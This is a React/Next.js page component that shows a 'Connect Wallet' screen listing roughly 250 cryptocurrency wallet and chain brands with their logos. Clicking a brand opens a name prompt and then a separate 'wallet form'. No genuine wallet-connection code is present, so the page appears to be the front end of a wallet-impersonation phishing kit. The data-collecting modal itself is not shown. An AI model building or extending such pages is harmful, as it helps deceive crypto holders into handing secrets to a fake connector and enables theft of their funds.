'use client'

import { useState, useMemo } from 'react'
import NameModal from './NameModal'
import ContactModal from './ContactModal'
import styles from './page.module.css'

type CircleItem = {
  id: string
  label: string
  image: string | null
}

const WALLET_NAMES = [
  'UNISWAP Wallet', 'Best Wallet', 'Wallet Connect', 'Trust', 'Metamask', 'Ledger',
  'Coinbase', 'Unisat Wallet', 'Solfare Wallet', 'Phantom wallet', 'Solana Wallet', 'Tangem Wallet',
  'coldcard wallet', 'Xaman wallet', 'Trojan Bot', 'okx Wallet', 'Sui Wallet', 'Leather Wallet',
  'APTOS Wallet', 'Asigna Wallet', 'AVAXC Wallet', 'Base Wallet', 'BITTENSOR Wallet', 'AURORA Wallet',
  'Xverse Wallet', 'OPTIMISM Wallet', 'MyTon Wallet', 'Tonkeeper Wallet', 'TonHub Wallet', 'Electrum Wallet',
  'Magic Eden', 'STACKS Wallet', 'MOONBEAM', 'BRD wallet', 'ETHPOW wallet', 'TON wallet',
  'Saitamask wallet', 'ARBITRUM wallet', 'Terra station', 'METIS station', 'CRO wallet', 'Cosmos station',
  'CUBE Wallet', 'Exodus wallet', 'OKC wallet', 'Rainbow', 'HECO', 'Argent',
  'MOONRIVER', 'Binance Chain', 'Safemoon', 'CELO', 'Gnosis Safe', 'FANTOM',
  'DeFi', 'LITECOIN', 'Pillar', 'imToken', 'POLYGON', 'CORE',
  'BITCOINCASH', 'ONTO', 'BOBA', 'EVMOS', 'THORCHAIN', 'TokenPocket',
  'Aave', 'Digitex', 'Portis', 'Formatic', 'MathWallet', 'BitPay',
  'Ledger Live', 'WallETH', 'Authereum', 'Dharma', '1inch Wallet', 'Huobi',
  'Eidoo', 'MYKEY', 'Loopring', 'TrustVault', 'Atomic', 'Coin98',
  'Tron', 'Alice', 'KUJIRA', 'AKASH', 'UMEE', 'IRIS',
  'REGEN', 'GNOSIS', 'OSMOSIS', 'BITSONG', 'KI', 'SECRET',
  'CRO-COSMOS', 'LUM', 'STARNAME', 'SIF', 'BITCANNA', 'DESMOS',
  'JUNO', 'PERSISTENCE', 'SENTINEL', 'EMONEY', 'KONSTELLATION', 'STARGAZE',
  'MARS', 'STRIDE', 'NOM', 'CHIHUAHUA', 'FETCH AI', 'METER',
  'INJECTIVE', 'COMDEX', 'BANDCHAIN', 'KUSAMA', 'HATHOR', 'LUNA',
  'ENJIN', 'ALEPHIUM', 'HIVE', 'AlphaWallet', 'XDC', 'NORDEK',
  'BROCK', 'ARBITRUM NOVA', 'ZKSYNC ERA', 'AIRDAO', 'ETC', 'REI',
  'RSK', 'THETA', 'CASPER', 'BOBA BNB', 'TENET', 'POLYGON ZKEVM',
  'SEI', 'MANTLE', 'SYSCOIN', 'TARAXA', 'LINEA', 'OPBNB',
  'LUKSO', 'CELESTIA', 'NEUTRON', 'ORAI', 'EWT', 'FLARE',
  'MANTA', 'ZETACHAIN', 'TOMOCHAIN', 'WANCHAIN', 'ELECTRONEUM', 'ZKLINK NOVA',
  'TAIKO', 'WEMIX', 'BITGERT', 'DYDX', 'ASTAR', 'NANO',
  'POCKET', "D'CENT", 'FUSE', 'DOGE', 'COSMOS', 'ZelCore',
  'KCC', 'KAVA EVM', 'KAVA IBC', 'BLAST', 'BOUNCEBIT', 'NIBIRU',
  'RONIN', 'XPLA', 'ANDROMEDA', 'SAGA', 'TELOSEVM', 'MICRO VISION CHAIN',
  'DYMENSION IBC', 'DYMENSION EVM', 'ZIRCUIT', 'KASPA', 'RIPPLE', 'AZERO',
  'POLKADOT', 'DOGECHAIN', 'WALTONCHAIN', 'ARWEAVE', 'INTERNET COMPUTER', 'FLUX',
  'NEXA', 'COMAI', 'MAPO', 'SCROLL', 'MODE', 'MERLIN',
  'STARKNET', 'CARDANO', 'ALGORAND', 'MONERO', 'STELLAR', 'FILECOIN',
  'DOR', 'DAG', 'VENOM', 'PARTISIA', 'AVAIL', 'RAVEN',
  'HEDERA', 'EOS', 'EGLD', 'XTZ', 'FLOW', 'CONFLUX',
  'NEAR', 'PHANTASMA', 'Coinmoni', 'GridPlus', 'CYBAVO', 'Tokenary',
  'Torus', 'Spatium', 'SafePal', 'Infinito', 'wallet.io', 'Ownbit',
  'EasyPocket', 'Bridge Wallet', 'Spark Point', 'ViaWallet', 'BitKeep', 'Vision',
  'PEAKDEFI', 'Unstoppable', 'HaloDeFi', 'Dok Wallet', 'Midas', 'Ellipal',
  'KEYRING PRO', 'Aktionariat', 'Talken', 'Flare', 'KyberSwap', 'PayTube',
  'Linen',
]

const WALLET_IMAGES: Record<string, string> = {
  'UNISWAP Wallet': '/Picture/Uniswap.webp',
  'Best Wallet': '/Picture/bestwallet.jpg',
  'Wallet Connect': '/Picture/walletconnect.webp',
  'Trust': '/Picture/trustwallet.png',
  'Metamask': '/Picture/MetaMask-icon-Fox.svg',
  'Ledger': '/Picture/Ledger-nano-logo.png',
  'Coinbase': '/Picture/Coinbase.png',
  'Unisat Wallet': '/Picture/unisat.jpg',
  'Solfare Wallet': '/Picture/Solflarewallet.jpg',
  'Phantom wallet': '/Picture/phantom.jpeg',
  'Solana Wallet': '/Picture/solana.png',
  'Tangem Wallet': '/Picture/tangem.png',
  'coldcard wallet': '/Picture/coldcard.webp',
  'Xaman wallet': '/Picture/xaman.jpg',
  'Trojan Bot': '/Picture/trojan.jpg',
  'okx Wallet': '/Picture/okx.png',
  'Sui Wallet': '/Picture/sui.png',
  'Leather Wallet': '/Picture/leather.svg',
  'APTOS Wallet': '/Picture/aptos.webp',
  'Asigna Wallet': '/Picture/asigna.jpg',
  'AVAXC Wallet': '/Picture/avax.png',
  'Base Wallet': '/Picture/base.webp',
  'BITTENSOR Wallet': '/Picture/tao.webp',
  'AURORA Wallet': '/Picture/aurora.svg',
  'Xverse Wallet': '/Picture/Xverse.jpg',
  'OPTIMISM Wallet': '/Picture/optimism.svg',
  'MyTon Wallet': '/Picture/MyTonWallet.jpg',
  'Tonkeeper Wallet': '/Picture/Tonkeeperwallet.jpg',
  'TonHub Wallet': '/Picture/TonHubWallet.jpg',
  'Electrum Wallet': '/Picture/Electrum.jpg',
  'Magic Eden': '/Picture/magic_eden.png',
  'STACKS Wallet': '/Picture/stacks.png',
  'MOONBEAM': '/Picture/moonbeam.webp',
  'BRD wallet': '/Picture/brd.jpg',
  'ETHPOW wallet': '/Picture/ethereum-pow.webp',
  'TON wallet': '/Picture/ton.webp',
  'Saitamask wallet': '/Picture/saitama.png',
  'ARBITRUM wallet': '/Picture/arbitrum.svg',
  'Terra station': '/Picture/terra.png',
  'METIS station': '/Picture/metis.svg',
  'CRO wallet': '/Picture/cronos.svg',
  'Cosmos station': '/Picture/cosmos.png',
  'CUBE Wallet': '/Picture/cube.png',
  'Exodus wallet': '/Picture/exodus.png',
  'OKC wallet': '/Picture/KCC.svg',
  'Rainbow': '/Picture/rainbow.png',
  'HECO': '/Picture/heco.png',
  'Argent': '/Picture/argent.jpg',
  'MOONRIVER': '/Picture/moonriver.webp',
  'Binance Chain': '/Picture/binance.png',
  'Safemoon': '/Picture/safemoon.png',
  'CELO': '/Picture/celo.png',
  'Gnosis Safe': '/Picture/gnosis.jpg',
  'FANTOM': '/Picture/fantom.svg',
  'DeFi': '/Picture/defi.jpg',
  'LITECOIN': '/Picture/litecoin.svg',
  'Pillar': '/Picture/pillar.png',
  'imToken': '/Picture/imtoken.png',
  'POLYGON': '/Picture/polygon.png',
  'CORE': '/Picture/core-dao.svg',
  'BITCOINCASH': '/Picture/bitcoin-cash.png',
  'ONTO': '/Picture/onto.jpg',
  'BOBA': '/Picture/boba.svg',
  'EVMOS': '/Picture/evmos.png',
  'THORCHAIN': '/Picture/thorchain.svg',
  'TokenPocket': '/Picture/tokenpocket.png',
  'Aave': '/Picture/aave-aave-logo.png',
  'Digitex': '/Picture/digitex.png',
  'Portis': '/Picture/portis_logo_dribbble.png',
  'Formatic': '/Picture/formatic.jpg',
  'MathWallet': '/Picture/mathwallet.jpg',
  'BitPay': '/Picture/bitpay.jpg',
  'Ledger Live': '/Picture/ledgerlive.jpg',
  'WallETH': '/Picture/walleth.png',
  'Authereum': '/Picture/authereum.png',
  'Dharma': '/Picture/dharma.png',
  '1inch Wallet': '/Picture/1inch.jpg',
  'Huobi': '/Picture/huboi.jpg',
  'Eidoo': '/Picture/eidoo.jpg',
  'MYKEY': '/Picture/mykey.jpg',
  'Loopring': '/Picture/loopring.jpg',
  'TrustVault': '/Picture/trustvault.png',
  'Atomic': '/Picture/atomic.png',
  'Coin98': '/Picture/coin98.png',
  'Tron': '/Picture/tron.png',
  'Alice': '/Picture/alice.png',
  'KUJIRA': '/Picture/kujira.webp',
  'AKASH': '/Picture/akash.png',
  'UMEE': '/Picture/umee.png',
  'IRIS': '/Picture/iris.png',
  'REGEN': '/Picture/regen.png',
  'GNOSIS': '/Picture/gnosis.png',
  'OSMOSIS': '/Picture/osmosis.png',
  'BITSONG': '/Picture/bitsong.png',
  'KI': '/Picture/ki.png',
  'SECRET': '/Picture/secret.png',
  'CRO-COSMOS': '/Picture/cro-cosmos.png',
  'LUM': '/Picture/lum.png',
  'STARNAME': '/Picture/starname.png',
  'SIF': '/Picture/sif.png',
  'BITCANNA': '/Picture/bitcanna.png',
  'DESMOS': '/Picture/desmos.png',
  'JUNO': '/Picture/juno.png',
  'PERSISTENCE': '/Picture/persistence.png',
  'SENTINEL': '/Picture/sentinel.png',
  'EMONEY': '/Picture/emoney.svg',
  'KONSTELLATION': '/Picture/konstellation.png',
  'STARGAZE': '/Picture/stargaze.png',
  'MARS': '/Picture/mars.svg',
  'STRIDE': '/Picture/stride.png',
  'NOM': '/Picture/nom.png',
  'CHIHUAHUA': '/Picture/chihuahua.png',
  'FETCH AI': '/Picture/fetch.png',
  'METER': '/Picture/meter.webp',
  'INJECTIVE': '/Picture/injective.png',
  'COMDEX': '/Picture/comdex.png',
  'BANDCHAIN': '/Picture/bandchain.png',
  'KUSAMA': '/Picture/kusama.webp',
  'HATHOR': '/Picture/hathor.webp',
  'LUNA': '/Picture/luna.webp',
  'ENJIN': '/Picture/enjin.webp',
  'ALEPHIUM': '/Picture/alephium.webp',
  'HIVE': '/Picture/hive.webp',
  'AlphaWallet': '/Picture/alpha.jpg',
  'XDC': '/Picture/xdc.png',
  'NORDEK': '/Picture/nordek.webp',
  'BROCK': '/Picture/brock.webp',
  'ARBITRUM NOVA': '/Picture/arbitrumNova.webp',
  'ZKSYNC ERA': '/Picture/zksync-era.png',
  'AIRDAO': '/Picture/airdao.webp',
  'ETC': '/Picture/etc.png',
  'REI': '/Picture/rei.webp',
  'RSK': '/Picture/rsk.webp',
  'THETA': '/Picture/theta.webp',
  'CASPER': '/Picture/casper.webp',
  'BOBA BNB': '/Picture/BOBA.webp',
  'TENET': '/Picture/tenet.webp',
  'POLYGON ZKEVM': '/Picture/matic-token-icon.webp',
  'SEI': '/Picture/sei.webp',
  'MANTLE': '/Picture/mantle.webp',
  'SYSCOIN': '/Picture/syscoin.webp',
  'TARAXA': '/Picture/taraxa.webp',
  'LINEA': '/Picture/linea.webp',
  'OPBNB': '/Picture/opbnb.svg',
  'LUKSO': '/Picture/lukso.webp',
  'CELESTIA': '/Picture/celestia.webp',
  'NEUTRON': '/Picture/neutron.webp',
  'ORAI': '/Picture/orai.webp',
  'EWT': '/Picture/ewt.webp',
  'FLARE': '/Picture/flare.webp',
  'MANTA': '/Picture/manta.webp',
  'ZETACHAIN': '/Picture/zetachain.webp',
  'TOMOCHAIN': '/Picture/tomochain.webp',
  'WANCHAIN': '/Picture/wanchain.webp',
  'ELECTRONEUM': '/Picture/electroneum.webp',
  'ZKLINK NOVA': '/Picture/zklink.webp',
  'TAIKO': '/Picture/taiko.webp',
  'WEMIX': '/Picture/wemix.webp',
  'BITGERT': '/Picture/bitgert.webp',
  'DYDX': '/Picture/dydx.webp',
  'ASTAR': '/Picture/astr.webp',
  'NANO': '/Picture/nano.webp',
  'POCKET': '/Picture/pokt.webp',
  "D'CENT": '/Picture/dcent.png',
  'FUSE': '/Picture/fuse.png',
  'DOGE': '/Picture/doge.png',
  'COSMOS': '/Picture/cosmos.svg',
  'ZelCore': '/Picture/zelcore.png',
  'KCC': '/Picture/KCC.svg',
  'KAVA EVM': '/Picture/kavaevm.webp',
  'KAVA IBC': '/Picture/kavaibc.webp',
  'BLAST': '/Picture/Blast.webp',
  'BOUNCEBIT': '/Picture/bouncebit.webp',
  'NIBIRU': '/Picture/nibiru.webp',
  'RONIN': '/Picture/ronin.webp',
  'XPLA': '/Picture/xpla.webp',
  'ANDROMEDA': '/Picture/andr.webp',
  'SAGA': '/Picture/saga.webp',
  'TELOSEVM': '/Picture/telos.webp',
  'MICRO VISION CHAIN': '/Picture/mpc.webp',
  'DYMENSION IBC': '/Picture/dymibc.webp',
  'DYMENSION EVM': '/Picture/dymevm.webp',
  'ZIRCUIT': '/Picture/rsz_zircuit.webp',
  'KASPA': '/Picture/kaspa.webp',
  'RIPPLE': '/Picture/xrp.webp',
  'AZERO': '/Picture/azero.webp',
  'POLKADOT': '/Picture/dot.webp',
  'DOGECHAIN': '/Picture/dogeevm.webp',
  'WALTONCHAIN': '/Picture/wtc.webp',
  'ARWEAVE': '/Picture/ar.webp',
  'INTERNET COMPUTER': '/Picture/icp.webp',
  'FLUX': '/Picture/flux.webp',
  'NEXA': '/Picture/nexa.webp',
  'COMAI': '/Picture/comai.webp',
  'MAPO': '/Picture/mapo.webp',
  'SCROLL': '/Picture/scroll.webp',
  'MODE': '/Picture/mode.webp',
  'MERLIN': '/Picture/merl.webp',
  'STARKNET': '/Picture/starknet.webp',
  'CARDANO': '/Picture/ada.webp',
  'ALGORAND': '/Picture/algo.webp',
  'MONERO': '/Picture/xmr.webp',
  'STELLAR': '/Picture/xlm.webp',
  'FILECOIN': '/Picture/fil.webp',
  'DOR': '/Picture/dor.webp',
  'DAG': '/Picture/dag.webp',
  'VENOM': '/Picture/venom.webp',
  'PARTISIA': '/Picture/mpc.webp',
  'AVAIL': '/Picture/avail.webp',
  'RAVEN': '/Picture/rvn.webp',
  'HEDERA': '/Picture/hbar.webp',
  'EOS': '/Picture/eos.webp',
  'EGLD': '/Picture/egld.webp',
  'XTZ': '/Picture/xtz.webp',
  'FLOW': '/Picture/flow.webp',
  'CONFLUX': '/Picture/cfx.webp',
  'NEAR': '/Picture/near.webp',
  'PHANTASMA': '/Picture/phantasma.webp',
  'Coinmoni': '/Picture/coinmoni.png',
  'GridPlus': '/Picture/gridplus.png',
  'CYBAVO': '/Picture/cybavo.png',
  'Tokenary': '/Picture/tokenary.jpg',
  'Torus': '/Picture/torus.png',
  'Spatium': '/Picture/spatium.png',
  'SafePal': '/Picture/safepal.png',
  'Infinito': '/Picture/infinito.png',
  'wallet.io': '/Picture/wallet.png',
  'Ownbit': '/Picture/ownbit.png',
  'EasyPocket': '/Picture/easypocket.jpg',
  'Bridge Wallet': '/Picture/bridgewallet.png',
  'Spark Point': '/Picture/Sparkpoint-wallet-logo.png',
  'ViaWallet': '/Picture/via.png',
  'BitKeep': '/Picture/bitkeep.jpg',
  'Vision': '/Picture/vision.jpg',
  'PEAKDEFI': '/Picture/peakdefi.png',
  'Unstoppable': '/Picture/unstoppable.png',
  'HaloDeFi': '/Picture/halodefi.png',
  'Dok Wallet': '/Picture/dokwallet.png',
  'Midas': '/Picture/midas.png',
  'Ellipal': '/Picture/ellipal.png',
  'KEYRING PRO': '/Picture/keyring.png',
  'Aktionariat': '/Picture/aktion.jpg',
  'Talken': '/Picture/talken.png',
  'Flare': '/Picture/flare.png',
  'KyberSwap': '/Picture/kyberswap.jpg',
  'PayTube': '/Picture/paytube.png',
  'Linen': '/Picture/linen.png',
}

function slugify(name: string) {
  return name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '')
}

const items: CircleItem[] = WALLET_NAMES.map((name, index) => ({
  id: `${slugify(name)}-${index}`,
  label: name,
  image: WALLET_IMAGES[name] ?? null,
}))

export default function ContactPage() {
  const [nameModalOpen, setNameModalOpen] = useState(false)
  const [modalOpen, setModalOpen] = useState(false)
  const [pendingItem, setPendingItem] = useState<CircleItem | null>(null)
  const [activeItem, setActiveItem] = useState<CircleItem | null>(null)
  const [userName, setUserName] = useState('')
  const [query, setQuery] = useState('')

  const filteredItems = useMemo(() => {
    const q = query.trim().toLowerCase()
    if (!q) return items
    return items.filter((item) => item.label.toLowerCase().includes(q))
  }, [query])

  // Step 1: open name modal, remember which circle was clicked
  function handleCircleClick(item: CircleItem) {
    setPendingItem(item)
    setNameModalOpen(true)
  }

  // Step 2: name submitted — close name modal, open wallet form
  function handleNameSubmit(name: string) {
    setUserName(name)
    setNameModalOpen(false)
    setActiveItem(pendingItem)
    setModalOpen(true)
    setPendingItem(null)
  }

  function handleNameClose() {
    setNameModalOpen(false)
    setPendingItem(null)
  }

  function handleClose() {
    setModalOpen(false)
  }

  return (
    <div className={styles.page}>
      <div className={styles.pageHeader}>
        <div className={styles.headerIcon} aria-hidden="true">
          ◆
        </div>
        <h1 className={styles.pageTitle}>Connect Wallet</h1>
        <p className={styles.pageSubtitle}>Please connect your wallet to continue</p>

        <div className={styles.searchWrap}>
          <input
            type="text"
            className={styles.searchInput}
            placeholder="Search wallet names..."
            value={query}
            onChange={(e) => setQuery(e.target.value)}
          />
        </div>
      </div>

      {filteredItems.length === 0 ? (
        <p className={styles.noResults}>No wallets match &quot;{query}&quot;</p>
      ) : (
        <div className={styles.circleGrid}>
          {filteredItems.map((item) => (
            <div key={item.id} className={styles.circleWrapper}>
              <button
                type="button"
                className={styles.circle}
                onClick={() => handleCircleClick(item)}
              >
                {item.image ? (
                  <img src={item.image} alt={item.label} className={styles.circleImage} />
                ) : (
                  item.label[0]
                )}
              </button>
              <span className={styles.circleLabel}>{item.label}</span>
            </div>
          ))}
        </div>
      )}

      <NameModal
        open={nameModalOpen}
        onSubmit={handleNameSubmit}
        onClose={handleNameClose}
        selectedItem={pendingItem}
      />

      <ContactModal
        open={modalOpen}
        onClose={handleClose}
        selectedItem={activeItem}
        walletAddress={userName}
      />
    </div>
  )
}